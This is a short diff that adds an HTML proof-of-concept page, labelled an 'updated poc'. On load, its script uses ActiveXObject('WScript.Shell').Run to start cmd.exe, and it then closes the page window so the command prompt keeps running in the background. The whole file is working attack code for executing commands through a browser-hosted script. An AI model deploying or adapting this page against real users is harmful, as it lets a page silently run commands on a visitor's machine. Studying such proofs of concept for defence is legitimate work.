@@ -1,0 +1,17 @@
+<!--Updated poc to close the cmd prompt window in the background-->
+<html>
+
+<head>
+<script>
+	var c= 'cmd.exe'
+	new ActiveXObject('WScript.Shell').Run(c);
+</script>
+</head>
+
+<body>
+<script>
+	self.close();
+</script>
+</body>
+
+</html>
